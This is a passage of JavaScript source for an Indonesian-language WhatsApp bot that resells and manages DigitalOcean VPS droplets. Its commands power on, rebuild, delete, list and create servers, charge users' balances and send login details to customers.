            Authorization: `Bearer ${API_TOKEN}`,
          },
        }
      );

      if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
        reply('VPS (Droplet) sedang dihidupkan...');
      } else {
        reply('Gagal menghidupkan VPS (Droplet).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat menghidupkan VPS (Droplet):', error.message);
    }
  }

  turnOnDroplet();
  break;
}
        
        
case "rebuild": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
  if (!isOwner) return m.reply(`Lu Siapanya Gua Anjg Gausah Nyuruh Nyuruh Gua Anjg`);

  let dropletId = args[0];
  if (!dropletId) return m.reply('ID droplet belum diberikan.');

  let rebuildVPS = async () => {
    try {
      // Rebuild droplet menggunakan API DigitalOcean
      const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        },
        body: JSON.stringify({
          type: 'rebuild',
          image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
        })
      });

      if (response.ok) {
        const data = await response.json();
        reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);

        // Mendapatkan informasi VPS setelah rebuild
        const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${API_TOKEN}`
          }
        });

        if (vpsInfo.ok) {
          const vpsData = await vpsInfo.json();
          const droplet = vpsData.droplet;
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';

          const textvps = `*VPS SUKSES REBUILD*\nIP VPS: ${ipAddress}\nSYSTEM IMAGE: ${droplet.image.slug}`;
          await sleep(60000) 
 Biiofc.sendMessage(m.chat, { text: textvps });
        } else {
          reply('Gagal mendapatkan informasi VPS setelah rebuild.');
        }
      } else {
        const errorData = await response.json();
        reply('Gagal melakukan rebuild VPS:', errorData.message);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan rebuild VPS:', error);
    }
  };

  rebuildVPS();
}
break;

        case "deldroplet": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
  if (!isOwner) return m.reply('Maaf, command ini hanya untuk pemilik.');

  let dropletId = args[0];
  if (!dropletId) return m.reply('ID droplet belum diberikan.');

  let deleteDroplet = async () => {
    try {
      let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'DELETE',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        }
      });

      if (response.ok) {
        m.reply('Droplet berhasil dihapus.');
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal menghapus droplet: ${errorData.message}`);
      }
    } catch (error) {
      console.error('Terjadi kesalahan saat menghapus droplet:', error);
      m.reply('Terjadi kesalahan saat menghapus droplet.');
    }
  };

  deleteDroplet();

  break;
}
 case "listdroplet": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
  if (!isOwner) return m.reply("Anda bukan pemilik.");

  try {
    const getDroplets = async () => {
      try {
        const response = await fetch('https://api.digitalocean.com/v2/droplets', {
          headers: {
            Authorization: "Bearer " + API_TOKEN
          }
        });
        const data = await response.json();
        return data.droplets || [];
      } catch (error) {
        reply('Error fetching droplets: ' + error);
        return [];
      }
    };

    getDroplets().then(droplets => {
      let totalvps = droplets.length;
      let mesej = `List Droplet Digital Ocean Anda: ${totalvps}\n\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;

      if (droplets.length === 0) {
        mesej += 'Tidak ada Droplet yang tersedia.';
      } else {
        droplets.forEach(droplet => {
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';
          mesej += `- Droplet Id: ${droplet.id}\n- Hostname: ${droplet.name}\n- Username Login: root\n- IP: ${ipAddress}\n- Ram: ${droplet.memory} MB\n- Cpu: ${droplet.vcpus} CPU\n- OS: ${droplet.image.distribution}\n- Storage: ${droplet.disk} GB\n- Status: ${droplet.status}\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;
        });
      }
      Biiofc.sendMessage(m.chat, { text: mesej });
    });
  } catch (err) {
    reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
  }

  break;
}
    
 case "cekdroplet": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
  if (!isOwner) return m.reply(`Ngapain? Kepo Amat Dah`);

  let dropletId = args[0];
  if (!dropletId) return m.reply('ID droplet belum diberikan.');

  // Mendapatkan informasi droplet (VPS) berdasarkan ID
  const getDropletInfo = async (dropletId) => {
    try {
      const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}`;
      const response = await fetch(apiUrl, {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        }
      });

      if (response.ok) {
        const data = await response.json();
        const droplet = data.droplet;
        const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
        const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';
        const vpsRam = droplet.memory / 1024;

        return {
          dropletid: droplet.id,
          username: droplet.name,
          ip: ipAddress,
          ram: `${vpsRam} GB`,
          os: droplet.image.distribution,
          cpu: droplet.vcpus > 1 ? `${droplet.vcpus} vCPU` : `${droplet.vcpus} vCPUs`,
          storage: droplet.disk,
          status: droplet.status // Menambahkan status VPS
        };
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal memeriksa detail droplet: ${errorData.message}`);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat memeriksa detail droplet:', error.message);
      throw new Error('Terjadi kesalahan saat memeriksa detail droplet.');
    }
  };

  getDropletInfo(dropletId)
    .then((info) => {
      let textku = `*DETAIL VPS ANDA*\nDroplet Id: ${info.dropletid}\nHostname: ${info.username}\nIpv4 : ${info.ip}\nRam : ${info.ram}\nOS : ${info.os}\nCPU: ${info.cpu}\nStorage: ${info.storage}\nStatus : ${info.status}`;
      Biiofc.sendMessage(m.chat, { text: textku });
    })
    .catch((err) => {
      reply(err);
      Biiofc.sendMessage(m.chat, { text: 'Terjadi kesalahan saat memeriksa detail VPS.' });
    });

  break;
}
       
        
    case "buypaketvps1g1c": {
if (cekSaldo(sender,db_saldo) < 20000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let hostname = args[0];
if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-1gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 20000, db_saldo)
break

    case "buypaketvps2g1c": {
if (cekSaldo(sender,db_saldo) < 25000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp25.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 25000, db_saldo)
break  
 
    case "buypaketvps2g2c": {
if (cekSaldo(sender,db_saldo) < 30000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp30.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 30000, db_saldo)
break      
    case "buypaketvps4g2c": {
if (cekSaldo(sender,db_saldo) < 45000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp45.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-4gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 45000, db_saldo)
break        
     case "buypaketvps8g4c": {
if (cekSaldo(sender,db_saldo) < 55000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp55.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-4vcpu-8gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 55000, db_saldo)
break
    case "vps1g1c": {
if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
let hostname = args[0];
if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-1gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break

    case "vps2g1c": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break  
 
    case "vps2g2c": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break      
    case "vps4g2c": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-4gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break        
     case "vps8g4c": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-4vcpu-8gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break
case 'svps': case 'sendvps': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
		 if (!isOwner) return (`Ngapain? Khusus Owner!!`)
          if (!text) return m.reply(`Example : ${prefix + command} 6285xxxxx,ip,ram,harga,passwordvps`)
            m.reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m2 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
            var m4 = mon.split(",")[3]
            var m5 = mon.split(",")[4]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
Biiofc.sendMessage(mq1, {text:`*───❖》SanZ Offcial《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\n*Harga : ${m4}*\n*Hari : ${hariini}*\n*Tanggal : ${tanggal}*\n*Jam : ${jam}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Ip : ${m2}*\n*[+] Username : root*\n*[+] Password : ${m5}*\n*[+] Ram : ${m3}*\n\n*───《TOS VPS》───*\n\n*-JANGAN SAMPAI TERKENA DDOS*\n*-JANGAN GUNAKAN UNTUK DDOS*\n*-JANGAN GUNAKAN UNTUK MINING*\n*-CPU JANGAN SAMPAI 100%*\n*-JANGAN DIPAKAI UNTUK TUNELING*\n*-MELANGGAR RULES? GARANSI ANGUS*\n*-PANEL SUS NO REFF*\n\n\n\n*© Rafathar Offcial*`}, m) 
}
break
 case 'sdomain': case 'sendomain': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
		 if (!isOwner) return reply(`Ngapain ? Khusus SanZ Offcial Aja !!`)
          if (!text) return m.reply(`Example : ${prefix + command} 6285xxxxx,harga,domain`)
